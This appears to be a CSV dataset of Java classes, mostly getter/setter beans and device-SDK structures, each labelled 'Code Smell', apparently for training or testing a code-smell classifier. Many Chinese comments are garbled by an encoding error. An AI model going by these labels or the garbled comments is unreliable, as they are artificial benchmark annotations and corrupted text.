text,label,text_label
"public class AdHocSubProcess extends SubProcess {
  private Expression completionCondition;
  private Boolean cancelRemainingInstances;
  private AdHocOrdering ordering;
  public Expression getCompletionCondition(){
    return completionCondition;
  }
  public void setCompletionCondition(  Expression completionCondition){
    this.completionCondition=completionCondition;
  }
  public Boolean getCancelRemainingInstances(){
    return cancelRemainingInstances;
  }
  public void setCancelRemainingInstances(  Boolean cancelRemainingInstances){
    this.cancelRemainingInstances=cancelRemainingInstances;
  }
  public AdHocOrdering getOrdering(){
    return ordering;
  }
  public void setOrdering(  AdHocOrdering ordering){
    this.ordering=ordering;
  }
}
",1,Code Smell
"/** 
 * Settings passed to the decoder by WebRTC. 
 */
public class Settings {
  public final int numberOfCores;
  public final int width;
  public final int height;
  @CalledByNative(""Settings"") public Settings(  int numberOfCores,  int width,  int height){
    this.numberOfCores=numberOfCores;
    this.width=width;
    this.height=height;
  }
}
/** 
 * Settings passed to the encoder by WebRTC. 
 */
public class Settings {
  public final int numberOfCores;
  public final int width;
  public final int height;
  public final int startBitrate;
  public final int maxFramerate;
  public final int numberOfSimulcastStreams;
  public final boolean automaticResizeOn;
  public final Capabilities capabilities;
  @Deprecated public Settings(  int numberOfCores,  int width,  int height,  int startBitrate,  int maxFramerate,  int numberOfSimulcastStreams,  boolean automaticResizeOn){
    this(numberOfCores,width,height,startBitrate,maxFramerate,numberOfSimulcastStreams,automaticResizeOn,new VideoEncoder.Capabilities(false));
  }
  @CalledByNative(""Settings"") public Settings(  int numberOfCores,  int width,  int height,  int startBitrate,  int maxFramerate,  int numberOfSimulcastStreams,  boolean automaticResizeOn,  Capabilities capabilities){
    this.numberOfCores=numberOfCores;
    this.width=width;
    this.height=height;
    this.startBitrate=startBitrate;
    this.maxFramerate=maxFramerate;
    this.numberOfSimulcastStreams=numberOfSimulcastStreams;
    this.automaticResizeOn=automaticResizeOn;
    this.capabilities=capabilities;
  }
}
",1,Code Smell
"public static class NET_DVR_FILECOND extends Structure {
  public int lChannel;
  public int dwFileType;
  public int dwIsLocked;
  public int dwUseCardNo;
  public byte[] sCardNumber=new byte[32];
  public NET_DVR_TIME struStartTime;
  public NET_DVR_TIME struStopTime;
}",1,Code Smell
"/** 
 * @author 251823
 * @description 瀹㈡祦閲忕粺璁D
 * @date 2021/01/11
 */
public class CFG_NUMBERSTAT_MULT_INFO extends NetSDKLib.SdkStructure {
  /** 
 * 鏈�澶ц繑鍥炶鍒欎釜鏁�
 */
  public int nMaxRules;
  /** 
 * 闅愯棌閮ㄥ垎鍙傛暟閰嶇疆浣胯兘 true-瀵逛簬StereoNumber/NumberStat绠楁硶澶х被锛岄殣钘廠tereoCalibrate鏍囧畾閰嶇疆鍜岃鍒欑殑MaxHeight/MinHeight
 */
  public int bHiddenDetailEnable;
  /** 
 * 鐩告満绫诲瀷锛�0锛氳〃绀鸿�佸崟鐩娴� 1锛氳〃绀烘柊缁熶竴鍗曠洰瀹㈡祦 2锛氳〃绀烘柊缁熶竴鍙岀洰瀹㈡祦
 */
  public int nCameraType;
  /** 
 * 鏀寔鐨勪簨浠剁被鍨嬭鍒欎釜鏁�
 */
  public int nMaxSupportedRulesNum;
  /** 
 * 鏀寔鐨勪簨浠剁被鍨嬭鍒欏垪琛紝浜嬩欢绫诲瀷锛岃瑙乨hnetsdk.h涓�""鏅鸿兘鍒嗘瀽浜嬩欢绫诲瀷""
 */
  public CFG_SUPPORTED_RULES_INFO[] stuSupportedRules=(CFG_SUPPORTED_RULES_INFO[])new CFG_SUPPORTED_RULES_INFO().toArray(NetSDKLib.MAX_RULE_LIST_SIZE);
  public CFG_NUMBERSTAT_MULT_INFO(){
    for (int i=0; i < stuSupportedRules.length; i++) {
      stuSupportedRules[i]=new CFG_SUPPORTED_RULES_INFO();
    }
  }
}",1,Code Smell
"/** 
 * 绗笁鏂瑰敭鍚庡崟鍟嗗搧
 * @author lzh 2022-04-20 16:30:29
 */
@ApiModel(""绗笁鏂瑰敭鍚庡崟鍟嗗搧"") @VersionAudit @ModifyAudit @JsonInclude(value=JsonInclude.Include.NON_NULL) @Table(name=""sord_third_party_after_sale_item"") @Data public class ThirdPartyAfterSaleItem extends AuditDomain {
  public static final String FIELD_ID=""id"";
  public static final String FIELD_OUT_REFUND_NO=""outRefundNo"";
  public static final String FIELD_OUTER_ORDER_NO=""outerOrderNo"";
  public static final String FIELD_TYPE=""type"";
  public static final String FIELD_SPU_CODE=""spuCode"";
  public static final String FIELD_SKU_CODE=""skuCode"";
  public static final String FIELD_SKU_NAME=""skuName"";
  public static final String FIELD_SPU_NAME=""spuName"";
  public static final String FIELD_OUTER_SALE_PRICE=""outerSalePrice"";
  public static final String FIELD_QUANTITY=""quantity"";
  public static final String FIELD_TOTAL_AMOUNT=""totalAmount"";
  @ApiModelProperty(""涓婚敭id"") @Id @GeneratedValue private Long id;
  @ApiModelProperty(value=""绗笁鏂归��璐у崟鍙�"") private String outRefundNo;
  @ApiModelProperty(value=""涓夋柟璁㈠崟鍙�"") private String outerOrderNo;
  @ApiModelProperty(value=""鍞悗绫诲瀷 1-涓夋柟閫�娆惧崟  2- 涓夋柟閫�璐ч��娆惧崟"") private String type;
  @ApiModelProperty(value=""鍟嗗搧缂栫爜"") private String spuCode;
  @ApiModelProperty(value=""SKU缂栫爜"") private String skuCode;
  @ApiModelProperty(value=""SKU鍚嶇О"") private String skuName;
  @ApiModelProperty(value=""spu鍚嶇О"") private String spuName;
  @ApiModelProperty(value=""涓夋柟閿�鍞崟浠�"") private BigDecimal outerSalePrice;
  @ApiModelProperty(value=""鏁伴噺"") private Long quantity;
  @ApiModelProperty(value=""閫�娆炬�婚噾棰�"") private BigDecimal totalAmount;
  @ApiModelProperty(value=""skuId"") private Long skuId;
  @ApiModelProperty(value=""鍟嗗搧绫诲瀷1.瀹炵墿2铏氭嫙"") private Integer spuType;
  @ApiModelProperty(value=""璧犲搧鏍囪瘑锛�0-鍗栧搧锛�1-璧犲搧"") private Integer giftFlag;
  @ApiModelProperty(value=""鍐呴儴璁㈠崟鍙�"") private String innerOrderNo;
}",1,Code Smell
"/** 
 * 淇敼璇剧▼璁板綍 鍏ュ弬鎸囬拡  {@link NetSDKLib#CLIENT_ModifyCourse}
 * @author 锛� 47040
 * @since 锛� Created in 2020/9/17 16:37
 */
public class NET_IN_MODIFY_COURSE extends NetSDKLib.SdkStructure {
  /** 
 * 缁撴瀯浣撳ぇ灏�
 */
  public int dwSize;
  /** 
 * 璇剧▼鏁伴噺
 */
  public int nCourseNum;
  /** 
 * 璇剧▼淇℃伅
 */
  public NET_COURSE[] stuCourseInfo=new NET_COURSE[64];
  /** 
 * 璇剧▼ID
 */
  public int[] nId=new int[64];
  public NET_IN_MODIFY_COURSE(){
    dwSize=this.size();
    for (int i=0; i < stuCourseInfo.length; i++) {
      stuCourseInfo[i]=new NET_COURSE();
    }
  }
}",1,Code Smell
"/** 
 * 绫籘empAttachMetaOption.java鐨勫疄鐜版弿杩帮細TODO 绫诲疄鐜版弿杩
 * @author lei.yaol 2011-12-27 涓嬪崍03:43:32
 */
public class TempAttachMetaOption implements Serializable {
  private static final long serialVersionUID=-8786217160252057362L;
  private Integer id;
  private String name;
  private String path;
  public Integer getId(){
    return id;
  }
  public void setId(  Integer id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getPath(){
    return path;
  }
  public void setPath(  String path){
    this.path=path;
  }
}",1,Code Smell
"@Table(value=""tb_idcard"") public class IDCard implements Serializable {
  private Long accountId;
  private String cardNo;
  private String content;
  public Long getAccountId(){
    return accountId;
  }
  public void setAccountId(  Long accountId){
    this.accountId=accountId;
  }
  public String getCardNo(){
    return cardNo;
  }
  public void setCardNo(  String cardNo){
    this.cardNo=cardNo;
  }
  public String getContent(){
    return content;
  }
  public void setContent(  String content){
    this.content=content;
  }
  @Override public String toString(){
    return ""IDCard{"" + ""accountId="" + accountId + "", cardNo='""+ cardNo+ '\''+ "", content='""+ content+ '\''+ '}';
  }
}
",1,Code Smell
"public static class RecommendBean {
  private long id=0L;
  private String name="""";
  public long getId(){
    return id;
  }
  public void setId(  long id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
}",1,Code Smell
"/** 
 * DS-6001D/F(end)
 */
public static class NET_DVR_SHOWSTRINGINFO extends Structure {
  public short wShowString;
  public short wStringSize;
  public short wShowStringTopLeftX;
  public short wShowStringTopLeftY;
  public byte[] sString=new byte[44];
}",1,Code Smell
